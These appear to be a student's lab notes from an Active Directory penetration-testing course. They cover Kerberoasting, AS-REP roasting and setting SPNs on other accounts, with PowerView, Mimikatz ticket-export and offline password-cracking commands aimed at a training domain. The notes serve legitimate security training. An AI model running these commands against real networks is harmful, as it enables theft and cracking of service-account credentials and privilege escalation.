# Kerberoast

• Offline cracking of service account passwords. 

• The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. 

• Service accounts are many times ignored (passwords are rarely changed) and have privileged access. 

• Password hashes of service accounts could be used to create Silver tickets.

#### Find user accounts used as Service accounts
```powershell
# PowerView
Get-NetUser –SPN

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```

#### Request a TGS
```powershell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local"
```

`Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.

#### Check if the TGS has been granted
```powershell
klist
```

#### Export all tickets using Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi
```

# Learning Objective 14

Using the Kerberoast attack, crack password of a SQL server service account.

# AS-REP Roasting

- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

#### Enumerating accounts with kerberos Preauth disabled
```powershell
# Using PowerView (dev)
Get-DomainUser -PreauthNotRequired -Verbose

# Using ActiveDirectory module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} - Properties DoesNotRequirePreAuth
```

### Force disable Kerberos Preauth

#### Enumerate the permissions for RDPUsers on ACLs using PowerView (dev):
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

### Request encrypted AS-REP for offline brute-force

#### ASREPRoast
```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```

#### Enumerate all users with Kerberos preauth disabled and request a hash
```powershell
Invoke-ASREPRoast -Verbose
```


#### Crack hash with John The Ripper

![[Pasted image 20230106200500.png]]

# Learning Objective 15

• Enumerate users that have Kerberos Preauth disabled.

• Obtain the encrypted part of AS-REP for such an account. 

• Determine if studentx has permissions to set UserAccountControl flags for any user. 

• If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.

# Set SPNs

• With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain). 

• We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

#### Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
```

#### Using Powerview (dev), see if the user already has a SPN
```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname 
```

#### Using ActiveDirectory module
```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

#### Set a SPN for the user (must be unique for the domain)
```powershell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}
```

#### Using Active Directory module
```powershell
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}
```

#### Request a ticket
```powershell
Add-Type -AssemblyNAme System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "ops/whatever1"
```

`Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.

#### Check if the ticket has been granted 
```powershell
klist.exe 
```

####  Export all tickets using Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"' 
```

####  Brute-force the password 
```cmd
python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2- 40a10000-student1@ops~whatever1- dollarcorp.moneycorp.LOCAL.kirbi'
```

# Learning Objective 16

- Determine if studentx has permissions to set UserAccountControl flags for any user. 

- If yes, force set a SPN on the user and obtain a TGS for the user.